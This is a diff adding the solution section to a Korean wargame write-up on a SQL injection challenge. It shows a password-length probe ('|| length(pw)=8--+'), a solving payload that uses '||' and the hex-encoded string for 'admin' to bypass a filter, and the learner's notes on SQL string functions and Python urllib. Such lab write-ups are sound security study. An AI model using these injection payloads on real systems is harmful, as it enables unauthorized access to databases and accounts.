@@ -48,3 +48,15 @@ admin이 떠서 이 쿼리가 참인것을 확인함
 # 현재 쿼리문: where id='admin' and pw=''|| length(pw)=8--+
 ```
 <참고> Python 코드 : [패스워드 길이]()
+```
+해결 쿼리문: id='guest' and no=0 || id like 0x61646d696e
+```
+### CERT <br> ?no=0 || id like 0x61646d696e
+
+### 느낀점
+```diff
++ SQL 문자열 관련 함수를 새롭게 알게 되었다.
++ 파이썬의 urllib를 새롭게 배웠다.
+```
+<참고> [SQL 문자열 관련 함수](https://rh-cp.tistory.com/60)
+<참고> [Python_Urllib]()
